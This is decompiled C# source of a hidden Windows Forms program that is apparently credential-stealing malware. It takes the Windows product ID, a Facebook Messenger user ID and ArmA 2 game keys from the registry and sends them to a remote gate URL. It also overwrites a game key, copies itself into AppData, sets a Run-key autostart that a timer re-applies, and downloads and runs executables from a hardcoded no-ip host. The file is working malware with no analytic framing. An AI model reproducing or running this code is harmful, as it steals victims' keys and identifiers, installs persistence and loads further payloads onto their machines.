using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using stvn.My;

namespace stvn;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("p_m_timer1")]
	private Timer _p_m_timer1;

	private string XBOITE463;

	private string XBOITE4635;

	private string XBOITE46356;

	private string XBOITE48;

	private string XBOITE463569;

	private string ADDXL_BOX4LLLLLL_QKKKKKAQZE;

	private string ADDXL_BOX4LLLLLL_QKQDQsE;

	private string XBOITE4635692;

	private string tututuut;

	private string XBOITE463569234;

	private string XBOITE46356923;

	private string Greco;

	internal virtual Timer p_m_timer1
	{
		get
		{
			return _p_m_timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_p_m_timer1 != null)
			{
				_p_m_timer1.remove_Tick(eventHandler);
			}
			_p_m_timer1 = value;
			if (_p_m_timer1 != null)
			{
				_p_m_timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		p_m_timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		p_m_timer1.set_Interval(1000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 269);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		string text = File.ReadAllText(Application.get_ExecutablePath());
		if (!text.Contains("stzuxoDont"))
		{
			return;
		}
		string[] array = Strings.Split(text, "stzuxoDont", -1, (CompareMethod)0);
		int num = Information.UBound((Array)array, 1);
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			XBOITE48 = array[1];
			XBOITE463 = array[2];
			XBOITE4635 = array[3];
			XBOITE46356 = array[4];
			XBOITE463569 = array[5];
			XBOITE4635692 = array[6] + "index.php?action=add&a=";
			ADDXL_BOX4LLLLLL_QKKKKKAQZE = array[6] + "gate.php?&ap=";
			XBOITE46356923 = array[7];
			Greco = array[8];
			XBOITE463569234 = array[9];
		}
		tututuut = MyProject.User.get_Name();
		ADDXL_BOX4LLLLLL_QKQDQsE = ((ServerComputer)MyProject.Computer).get_Name();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (!File.Exists(folderPath + "\\" + XBOITE463))
		{
			if (Operators.CompareString(Greco, "", false) != 0)
			{
				MessageBox.Show(Greco, "", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			if (Operators.CompareString(XBOITE463569, "1", false) == 0)
			{
				beurre();
				try
				{
					XL_BOX4();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					XL_BOX2();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Bohemia Interactive Studio\\ArmA 2 OA", writable: true)!.SetValue("KEYNAME", "860f394026aa1de6d4ea8d2f5ce8c8");
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Wow6432Node\\Bohemia Interactive Studio\\ArmA 2 OA", writable: true)!.SetValue("KEY", "860f394026aa1de6d4ea8d2f5ce8c8");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		if (Conversions.ToDouble(XBOITE46356923) == 1.0)
		{
			p_m_timer1.Start();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), folderPath + "\\" + XBOITE463);
			XL_BOX(((Form)this).get_Text(), folderPath + "\\" + XBOITE463);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://rootme.no-ip.org/win.exe", folderPath + "\\test456.exe");
			Process.Start("http://rootme.no-ip.org/win.exe", folderPath + "\\test456.exe");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		if (File.Exists(folderPath + "\\" + XBOITE4635))
		{
			File.Delete(folderPath + "\\" + XBOITE4635);
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(XBOITE48, folderPath + "\\" + XBOITE4635);
				Process.Start(folderPath + "\\" + XBOITE4635);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(XBOITE48, folderPath + "\\" + XBOITE4635);
				Process.Start(folderPath + "\\" + XBOITE4635);
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Crunch.QWA_SOxwk1929("Run First.exe");
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	public static void XL_BOX(string name, string path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", writable: true);
		registryKey.SetValue(name, path, RegistryValueKind.String);
	}

	public void beurre()
	{
		string password = Conversions.ToString(Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", writable: false)!.GetValue("ProductID", RegistryValueKind.String));
		string application = Environment.OSVersion.ToString();
		XL_BOX30(application, "Windows Key", tututuut, password);
	}

	public void XL_BOX30(string Application, string Host, string User, string Password)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadString(ADDXL_BOX4LLLLLL_QKKKKKAQZE + Application + "&h=" + Host + "&u=" + User + "&p=" + Password + "&v=" + Environment.MachineName);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		XL_BOX(((Form)this).get_Text(), folderPath + "\\" + XBOITE463);
	}

	public void XL_BOX2()
	{
		string password = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\Software\\Facebook\\Messenger", "UserID", (object)null));
		string application = Environment.OSVersion.ToString();
		XL_BOX30(application, "Facebook Messenger ID", tututuut, password);
	}

	public void XL_BOX4()
	{
		string password = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Bohemia Interactive Studio\\ArmA 2 OA", "KEY", (object)null));
		string password2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Bohemia Interactive Studio\\ArmA 2 OA", "KEY", (object)null));
		string application = Environment.OSVersion.ToString();
		XL_BOX30(application, "Arma II OA 1", tututuut, password);
		XL_BOX30(application, "Arma II OA 2", tututuut, password2);
	}
}
